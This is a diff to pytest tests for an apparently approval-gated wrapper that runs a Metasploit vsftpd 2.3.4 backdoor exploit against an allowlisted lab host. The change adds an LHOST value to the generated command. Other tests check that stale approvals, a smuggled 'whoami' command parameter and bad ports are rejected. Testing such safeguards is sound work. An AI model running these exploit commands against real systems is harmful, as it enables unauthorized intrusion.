@@ -18,8 +18,12 @@ def _proposal(
         action_id=action_id,
         target=target,
         rationale="Validate a confirmed Phase 2 finding in the authorized lab.",
-        expected_effect="Run the predefined controlled Metasploit validation action.",
-        parameters=parameters if parameters is not None else {"rport": 21},
+        expected_effect="Run the predefined controlled validation action.",
+        parameters=(
+            parameters
+            if parameters is not None
+            else {"rport": 21, "lhost": "172.16.0.13"}
+        ),
     )
 
 
@@ -55,7 +59,7 @@ def test_approved_authorized_action_invokes_exact_predefined_module(
     assert result.action_id == "validate_vsftpd_234_backdoor"
     assert result.target == "172.16.0.64"
     assert result.module == "exploit/unix/ftp/vsftpd_234_backdoor"
-    assert result.parameters == {"rport": 21}
+    assert result.parameters == {"rport": 21, "lhost": "172.16.0.13"}
     assert result.stdout == "session opened"
     assert result.stderr == ""
     assert result.exit_code == 0
@@ -66,6 +70,7 @@ def test_approved_authorized_action_invokes_exact_predefined_module(
     assert "exploit/unix/ftp/vsftpd_234_backdoor" in command
     assert "set RHOSTS 172.16.0.64" in command
     assert "set RPORT 21" in command
+    assert "set LHOST 172.16.0.13" in command
     assert "run" in command
 
 
@@ -144,9 +149,9 @@ def test_changed_proposal_invalidates_previous_approval(
 ) -> None:
     monkeypatch.setenv("PENTAIA_PHASE3_ALLOWLIST", "172.16.0.64")
 
-    original = _proposal(parameters={"rport": 21})
+    original = _proposal(parameters={"rport": 21, "lhost": "172.16.0.13"})
     approval = _approved(original)
-    changed = _proposal(parameters={"rport": 2121})
+    changed = _proposal(parameters={"rport": 2121, "lhost": "172.16.0.13"})
 
     with pytest.raises(ValueError, match="stale or belongs to a different action"):
         metasploit_wrapper.run_metasploit_action(changed, approval)
@@ -173,7 +178,13 @@ def test_unexpected_parameter_is_rejected_before_remote_execution(
 
     monkeypatch.setattr(metasploit_wrapper, "run_command", fake_run_command)
 
-    proposal = _proposal(parameters={"rport": 21, "command": "whoami"})
+    proposal = _proposal(
+        parameters={
+            "rport": 21,
+            "lhost": "172.16.0.13",
+            "command": "whoami",
+        }
+    )
 
     with pytest.raises(ValueError, match="Unsupported parameters"):
         metasploit_wrapper.run_metasploit_action(
@@ -190,7 +201,7 @@ def test_invalid_rport_is_rejected(
     rport,
 ) -> None:
     monkeypatch.setenv("PENTAIA_PHASE3_ALLOWLIST", "172.16.0.64")
-    proposal = _proposal(parameters={"rport": rport})
+    proposal = _proposal(parameters={"rport": rport, "lhost": "172.16.0.13"})
 
     with pytest.raises(ValueError, match="Metasploit rport"):
         metasploit_wrapper.run_metasploit_action(
